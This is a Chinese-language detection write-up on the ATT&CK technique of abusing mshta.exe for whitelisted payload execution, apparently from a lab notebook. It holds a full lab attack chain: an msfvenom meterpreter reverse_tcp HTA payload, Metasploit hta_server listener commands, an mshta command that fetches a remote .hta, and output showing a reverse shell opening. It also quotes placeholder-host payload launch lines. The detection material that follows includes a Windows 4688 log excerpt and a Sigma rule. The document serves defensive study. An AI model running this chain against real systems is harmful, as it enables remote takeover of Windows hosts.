# T1218-005-win-基于白名单Mshta.exe执行payload

## 来自ATT&CK的描述

Mshta.exe是一个执行微软HTA（HTML应用）的实用程序。HTA文件扩展名为.hta。HTA是独立的应用，使用与InternetExplorer相同的模型和技术来执行，但在浏览器之外执行。

攻击者可能会使用mshta.exe通过受信任的Windows实用程序来代理执行恶意.hta文件和Javascript或VBScript。已知攻击者在最初攻击阶段利用mshta.exe来执行代码的几个例子。

Mshta.exe可通过内联脚本来执行文件：mshtavbscript:Close(Execute("GetObject(""script:https[:]//webserver/payload[.]sct"")"))

也可以直接从URL执行：mshta http[:]//webserver/payload[.]hta

Mshta.exe可绕过不考虑其潜在用途的应用白名单解决方案。由于mshta.exe在InternetExplorer的安全上下文之外执行，因此它还会绕过浏览器安全设置。

## 测试案例

Mshta.exe是微软Windows操作系统相关程序，英文全称Microsoft HTML Application，可翻译为微软超文本标记语言应用，用于执行.HTA文件。

说明：Mshta所在路径已被系统添加PATH环境变量中，因此，可直接执行Mshta.exe命令。

补充说明：在高版本操作系统中，可以通过配置策略，对进程命令行参数进行记录。日志策略开启方法：`本地计算机策略>计算机配置>管理模板>系统>审核进程创建>在过程创建事件中加入命令行>启用`，同样也可以在不同版本操作系统中部署sysmon，通过sysmon日志进行监控。

Windows 7 默认位置：

C:\Windows\System32\mshta.exe

C:\Windows\SysWOW64\mshta.exe

## 检测日志

windows 安全日志（需要自行配置）

## 测试复现

### 环境准备

攻击机：Kali2019

靶机：windows server 2012

### 攻击分析

#### 生成payload

```bash
root@12306Br0:~# msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.126.146 LPORT=4444 -f hta-psh -o test5.hta

替换相关信息
```

#### 执行监听

```bash
use exploit/windows/misc/hta_server
msf exploit(windows/misc/hta_server) > set lhost 192.168.126.146
msf exploit(windows/misc/hta_server) > set srvhost 192.168.126.146
msf exploit(windows/misc/hta_server) > exploit
```

#### 靶机执行payload

```bash
mshta.exe http://192.168.126.146:8080/Uj6Tcv.hta  #需要安装.net Framework 3.5
```

#### 反弹shell

```bash
msf5 exploit(windows/misc/hta_server) > exploit
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on 192.168.126.146:4444
[*] Using URL: http://192.168.126.146:8080/Uj6Tcv.hta
[*] Server started.
msf5 exploit(windows/misc/hta_server) > [*] 192.168.126.156  hta_server - Delivering Payload
[*] Sending stage (180291 bytes) to 192.168.126.156
[*] Meterpreter session 1 opened (192.168.126.146:4444 -> 192.168.126.156:50232) at 2020-04-14 11:03:33 +0800
```

## 测试留痕

安全日志能够清晰的记录命令行参数，截取windows安全事件4688进程创建部分内容：

```log
事件ID： 4688
进程信息:
新进程 ID:0xb20
新进程名称:C:\Windows\System32\mshta.exe
令牌提升类型:TokenElevationTypeDefault (1)
创建者进程 ID:0x13c
进程命令行:mshta.exe  http://192.168.126.146:8080/Uj6Tcv.hta
```

## 检测规则/思路

通过进程监控来检测和分析mshta.exe的执行和参数。查找在命令行中执行原始或混淆脚本的mshta.exe。比较mshta.exe的近期调用与历史已知合法参数及已执行二进制文件来确定是否有异常和潜在的攻击活动。在mshta.exe调用之前和之后使用的命令参数也可用于确定正在执行的二进制文件的来源和目的。

### sigma规则

```yml
title: MSHTA Suspicious Execution 01
id: cc7abbd0-762b-41e3-8a26-57ad50d2eea3
status: experimental
description: Detection for mshta.exe suspicious execution patterns sometimes involving file polyglotism
date: 2019/02/22
modified: 2019/02/22
author: Diego Perez (@darkquassar), Markus Neis, Swisscom (Improve Rule)
references:
    - http://blog.sevagas.com/?Hacking-around-HTA-files
    - https://0x00sec.org/t/clientside-exploitation-in-2018-how-pentesting-has-changed/7356
    - https://docs.microsoft.com/en-us/dotnet/standard/data/xml/xslt-stylesheet-scripting-using-msxsl-script
    - https://medium.com/tsscyber/pentesting-and-hta-bypassing-powershell-constrained-language-mode-53a42856c997
tags:
    - attack.defense_evasion
    - attack.t1140
logsource:
    category: process_creation
    product: windows
falsepositives: 
    - False positives depend on scripts and administrative tools used in the monitored environment
level: high
detection:
    selection1:
        Image: '*\mshta.exe'
        CommandLine: 
            - '*vbscript*' 
            - '*.jpg*'
            - '*.png*'
            - '*.lnk*'
            # - '*.chm*'  # could be prone to false positives
            - '*.xls*'
            - '*.doc*'
            - '*.zip*'
    condition:
        selection1 
```

### 建议

暂无

## 参考推荐

MITRE-ATT&CK-T1218-005

<https://attack.mitre.org/techniques/T1218/005/>

远控免杀专题(37)-白名单Mshta.exe执行payload

<http://sec.nmask.cn/article_content?a_id=d1a4d20858c9283aef9ef49d2e98352c>

检测可疑的Mshta使用情况

<https://github.com/microsoft/Microsoft-365-Defender-Hunting-Queries/blob/master/Execution/detect-suspicious-mshta-usage.md>
